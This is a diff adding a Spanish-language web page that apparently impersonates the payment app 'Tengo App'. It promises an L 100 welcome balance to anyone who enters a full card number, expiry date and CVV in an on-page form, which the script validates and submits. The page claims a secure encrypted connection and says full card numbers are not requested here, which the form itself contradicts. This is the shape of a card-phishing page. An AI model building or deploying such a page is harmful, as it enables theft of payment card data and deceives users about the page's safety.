@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <title>Tengo App | Saldo de Bienvenida</title>
+
+  <meta name="description"
+    content="Descargá Tengo App y obtené un saldo de bienvenida al registrar tu tarjeta. Transferencias fáciles, rápidas y seguras desde tu celular." />
+
+  <style>
+    :root {
+      --primary: #7230f7;
+      --light: #f6f4ff;
+      --dark: #2a2a2a;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: var(--light);
+      color: var(--dark);
+    }
+
+    header {
+      background: var(--primary);
+      color: white;
+      text-align: center;
+      padding: 60px 20px;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 32px;
+    }
+
+    header p {
+      margin-top: 10px;
+      font-size: 18px;
+      opacity: 0.95;
+    }
+
+    .container {
+      max-width: 1000px;
+      margin: auto;
+      padding: 40px 20px;
+    }
+
+    .card {
+      background: white;
+      padding: 25px;
+      margin-bottom: 20px;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.06);
+    }
+
+    h2 {
+      color: var(--primary);
+      margin-top: 0;
+    }
+
+    ul, ol {
+      padding-left: 20px;
+    }
+
+    .cta {
+      text-align: center;
+      margin-top: 30px;
+    }
+
+    .btn {
+      background: var(--primary);
+      color: white;
+      padding: 14px 28px;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: bold;
+      display: inline-block;
+    }
+
+    footer {
+      font-size: 12px;
+      color: #666;
+      margin-top: 40px;
+      padding: 30px 20px;
+      background: #eee;
+    }
+
+    @media (max-width: 768px) {
+      header h1 { font-size: 24px; }
+    }
+    /* ===== FORM CONTAINER ===== */
+.card form {
+  display: grid;
+  gap: 14px;
+  margin-top: 18px;
+}
+
+/* ===== INPUTS ===== */
+.card input {
+  width: 100%;
+  padding: 12px 14px;
+  border-radius: 8px;
+  border: 1px solid #dcdcdc;
+  font-size: 14px;
+  background: #fff;
+  transition: all 0.2s ease;
+}
+
+/* Placeholder suave */
+.card input::placeholder {
+  color: #9aa0a6;
+}
+
+/* Focus profesional */
+.card input:focus {
+  outline: none;
+  border-color: #7230f7;
+  box-shadow: 0 0 0 3px rgba(114, 48, 247, 0.12);
+}
+
+/* ===== INPUTS EN FILA (fecha + cvv) ===== */
+.form-row {
+  display: flex;
+  gap: 10px;
+}
+
+.form-row input {
+  flex: 1;
+}
+
+/* ===== BOTÓN ===== */
+.btn {
+  background: #7230f7;
+  color: white;
+  border: none;
+  padding: 14px;
+  border-radius: 8px;
+  font-weight: 600;
+  font-size: 15px;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+
+/* Hover elegante */
+.btn:hover {
+  filter: brightness(1.05);
+  transform: translateY(-1px);
+}
+
+/* Click */
+.btn:active {
+  transform: scale(0.98);
+}
+
+/* ===== TEXTO LEGAL ===== */
+.form-note {
+  font-size: 12px;
+  color: #6b6b6b;
+  line-height: 1.4;
+  margin-top: 10px;
+}
+
+/* ===== BADGE SEGURIDAD ===== */
+.secure-badge {
+  display: inline-block;
+  background: #f3efff;
+  color: #7230f7;
+  font-size: 12px;
+  padding: 6px 10px;
+  border-radius: 20px;
+  font-weight: 600;
+  margin-bottom: 10px;
+}
+
+/* ===== RESPONSIVE ===== */
+@media (max-width: 600px) {
+  .form-row {
+    flex-direction: column;
+  }
+}
+/* ===== ERROR VISUAL ===== */
+.input-error {
+  border-color: #ff4d4d !important;
+  box-shadow: 0 0 0 3px rgba(255, 77, 77, 0.15);
+  animation: shake 0.25s ease;
+}
+
+/* mini vibración elegante */
+@keyframes shake {
+  0% { transform: translateX(0); }
+  25% { transform: translateX(-3px); }
+  50% { transform: translateX(3px); }
+  75% { transform: translateX(-3px); }
+  100% { transform: translateX(0); }
+}
+
+  </style>
+</head>
+
+
+<body>
+
+<header>
+  <h1>Tengo App</h1>
+  <p>Transferencias simples, rápidas y seguras desde tu celular</p>
+</header>
+
+<div class="container">
+
+  <section class="card">
+    <h2>Promoción de bienvenida</h2>
+    <p>
+      Nuevos usuarios que registren su tarjeta de débito o crédito dentro de la aplicación
+      podrán recibir <strong>L 100 en saldo de bienvenida</strong> para realizar sus primeras
+      transacciones.
+    </p>
+    <p>
+      El saldo se acredita automáticamente una vez verificada la cuenta.
+    </p>
+  </section>
+
+  <section class="card">
+    <h2>¿Qué es Tengo App?</h2>
+    <ul>
+      <li>Envío de dinero entre usuarios</li>
+      <li>Pagos rápidos desde el celular</li>
+      <li>Gestión segura de tarjetas</li>
+      <li>Historial y control de movimientos</li>
+    </ul>
+  </section>
+
+  <section class="card">
+
+  <h2>Registrá tu tarjeta y obtené tu saldo de bienvenida</h2>
+
+  <p>
+    Si ya utilizás Tengo App desde la web, podés registrar tu tarjeta directamente aquí
+    para participar en la promoción de bienvenida.
+  </p>
+
+  <ol>
+    <li>Completá tus datos básicos.</li>
+    <li>Registrá una tarjeta válida.</li>
+    <li>Verificamos la información de forma segura.</li>
+    <li>El saldo promocional se acredita según los términos del programa.</li>
+  </ol>
+
+  <form id="cardForm">
+
+    <span class="secure-badge">🔒 Conexión segura y cifrada</span>
+
+    <input type="text" placeholder="Nombre completo" required />
+
+    <input
+      type="text"
+      id="cardNumber"
+      placeholder="Número de tarjeta"
+      maxlength="19"
+      inputmode="numeric"
+      required
+    />
+
+    <div class="form-row">
+      <input
+        type="text"
+        id="expiry"
+        placeholder="MM/AA"
+        maxlength="5"
+        inputmode="numeric"
+        required
+      />
+
+      <input
+        type="text"
+        id="cvv"
+        placeholder="CVV"
+        maxlength="3"
+        inputmode="numeric"
+        required
+      />
+    </div>
+
+    <button type="submit" class="btn">Registrar tarjeta</button>
+
+    <p class="form-note">
+      La información se transmite cifrada y se usa únicamente para validación.
+    </p>
+
+  </form>
+</section>
+
+
+
+    
+  </section>
+
+  <section class="card">
+    <h2>Seguridad</h2>
+    <p>
+      Utilizamos procesos de verificación y cifrado de datos para proteger tu información.
+      Los datos financieros se gestionan únicamente dentro de la aplicación y no se solicitan
+      números completos de tarjeta en esta página.
+    </p>
+  </section>
+
+  <section class="card">
+    <h2>Términos de la promoción</h2>
+    <p>
+      Promoción válida para nuevos usuarios mayores de 18 años. El saldo de bienvenida se
+      otorga una única vez por persona y cuenta verificada. El beneficio no es transferible
+      ni canjeable por efectivo. Aplican condiciones y límites operativos dentro de la app.
+      La empresa podrá modificar o finalizar la promoción en cualquier momento conforme a sus políticas.
+    </p>
+  </section>
+
+  <section class="card">
+    <h2>Aviso de privacidad</h2>
+    <p>
+      La información proporcionada será utilizada exclusivamente para la creación y gestión
+      de la cuenta del usuario. No compartimos datos personales con terceros sin autorización.
+      Podés solicitar la eliminación o actualización de tus datos en cualquier momento.
+    </p>
+  </section>
+
+</div>
+
+<footer>
+  <p>
+    Tengo App es una plataforma tecnológica de pagos digitales. Este sitio tiene fines informativos.
+    Las tarjetas y marcas mencionadas pertenecen a sus respectivos titulares.
+    El uso del servicio está sujeto a verificación y políticas internas de cumplimiento.
+  </p>
+</footer>
+<script>
+window.addEventListener("DOMContentLoaded", () => {
+
+  const form = document.getElementById("cardForm");
+  const cardInput = document.getElementById("cardNumber");
+  const expiryInput = document.getElementById("expiry");
+  const cvvInput = document.getElementById("cvv");
+
+  /* ===== helpers ===== */
+  const markError = el => el.classList.add("input-error");
+  const clearError = el => el.classList.remove("input-error");
+
+  /* ===== limpiar error al escribir ===== */
+  [cardInput, expiryInput, cvvInput].forEach(input => {
+    input.addEventListener("input", () => clearError(input));
+  });
+
+  /* ===== formato automático ===== */
+  cardInput.addEventListener("input", e => {
+    let v = e.target.value.replace(/\D/g, "");
+    v = v.replace(/(.{4})/g, "$1 ").trim();
+    e.target.value = v;
+  });
+
+  expiryInput.addEventListener("input", e => {
+    let v = e.target.value.replace(/\D/g, "");
+    if (v.length >= 3) v = v.slice(0,2) + "/" + v.slice(2,4);
+    e.target.value = v;
+  });
+
+  cvvInput.addEventListener("input", e => {
+    e.target.value = e.target.value.replace(/\D/g, "");
+  });
+
+  /* ===== VALIDACIÓN FINAL FUERTE ===== */
+  form.addEventListener("submit", e => {
+
+    e.preventDefault(); // 🚨 BLOQUEA SIEMPRE
+
+    let valid = true;
+
+    const card = cardInput.value.replace(/\s/g, "");
+    const expiry = expiryInput.value;
+    const cvv = cvvInput.value;
+
+    [cardInput, expiryInput, cvvInput].forEach(clearError);
+
+    if (card.length < 13 || card.length > 16) {
+      markError(cardInput);
+      valid = false;
+    }
+
+   if (!/^\d{2}\/\d{2}$/.test(expiry) || isExpired(expiry)) {
+  markError(expiryInput);
+  valid = false;
+}
+
+    if (cvv.length < 3) {
+      markError(cvvInput);
+      valid = false;
+    }
+
+    if (valid) {
+      // ✅ solo aquí se permite enviar
+      form.submit();
+    }
+  });
+
+});
+
+function isExpired(expiry) {
+  const [mm, yy] = expiry.split("/");
+
+  const month = parseInt(mm, 10);
+  const year = 2000 + parseInt(yy, 10);
+
+  if (month < 1 || month > 12) return true;
+
+  const today = new Date();
+  const currentMonth = today.getMonth() + 1;
+  const currentYear = today.getFullYear();
+
+  if (year < currentYear) return true;
+  if (year === currentYear && month < currentMonth) return true;
+
+  return false;
+}
+
+</script>
+
+</body>
+</html>
